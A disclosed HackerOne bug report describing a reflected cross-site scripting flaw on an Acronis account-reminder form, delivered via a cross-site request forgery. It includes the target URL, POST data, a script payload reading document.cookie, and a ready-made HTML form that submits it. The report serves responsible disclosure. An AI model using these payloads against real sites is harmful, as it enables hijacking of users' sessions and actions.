# CSRF and XSS on www.acronis.com

## Report Details
- **Report ID**: 961787
- **URL**: https://hackerone.com/reports/961787
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-08-18T18:43:41.811Z
- **Disclosed**: 2024-08-26T15:33:28.834Z

## Reporter
- **Username**: cabelo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Hi team,

I've discovered a XSS Reflected vulnerability on Forgot Registration E-mail form. I performed a POC using CSRF  to inject and execute a javascript code in the POST request.

Target Page: https://www.acronis.com/en-us/my/remind/index.html

POST Data: token=a016902ceaeb6ae91c21302631fbbcfc&SN=818198181891891981981981516518198198&OrderId=&Submit=Send+E-mail%0D%0A

Payload: 1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--

Steps to reproduce/POC:

CSRF html page:
{F954073}

CORS html  code:
{F954074}

code:
```
<form action=https://www.acronis.com/en-us/my/remind/index.html method=POST><input type=hidden name="token" value="a016902ceaeb6ae91c21302631fbbcfc"><input type=hidden name="SN" value="818198181891891981981981516518198198"><input type=hidden name="OrderId" value=""><input type=hidden name="Submit" value="Send+E-mail%0D%0A"><input type=hidden name="c" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--"><input type=submit value=XSS-Acronis></form>
```

XSS:
{F954075}

Best Regards.

## Impact

An attacker execute arbitrary JavaScript code in the context of the users website.

## Attachments
- csrf-html.png
- csrf-html-code.png
- xss-acronis-post.png
